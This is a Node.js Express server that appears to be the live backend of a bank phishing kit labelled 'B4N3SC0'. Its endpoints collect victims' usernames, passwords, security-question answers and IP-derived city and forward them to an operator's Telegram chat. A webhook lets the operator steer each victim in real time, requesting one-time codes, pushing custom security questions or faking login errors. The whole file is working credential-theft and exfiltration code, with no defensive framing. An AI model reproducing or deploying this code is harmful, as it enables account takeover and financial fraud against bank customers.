const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}
function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  clientes[txid] = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null
  };
  guardarEstado();

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const {
    usar,
    clavv,
    txid,
    pregunta1,
    pregunta2,
    respuesta1,
    respuesta2
  } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❓🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

${pregunta1}❓ : ${respuesta1}
${pregunta2}❓ : ${respuesta2}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  if (clientes[txid]) {
    clientes[txid].status = "esperando"; // 🔁 Queda esperando a que tú lo muevas desde Telegram
    guardarEstado();
  }

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];
    const cliente = clientes[txid];

    if (!cliente) return res.sendStatus(404);

    if (accion === 'preguntas_menu') {
      cliente.preguntas = [];
      cliente.esperando = 'pregunta1';
      guardarEstado();

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid} separadas por "&".\n\nEjemplo:\n¿Dónde naciste?&¿Cuál es tu color favorito?`,
          reply_markup: {
            force_reply: true
          }
        })
      });

      return res.sendStatus(200);
    }

    cliente.status = accion;
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.message && req.body.message.reply_to_message) {
    const message = req.body.message;
    const chatId = message.chat.id;
    const text = message.text?.trim();

    const txidMatch = text.match(/^([a-z0-9]+)(.*)$/i);
    if (!txidMatch) return res.sendStatus(200);

    const txid = txidMatch[1];
    const resto = txidMatch[2].trim();

    if (!clientes[txid] || !resto.includes('&')) return res.sendStatus(200);

    const [p1, p2] = resto.split('&').map(p => p.trim());
    if (!p1 || !p2) return res.sendStatus(200);

    clientes[txid].preguntas = [p1, p2];
    clientes[txid].status = 'preguntas';
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${p1}\n2️⃣ ${p2}`
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
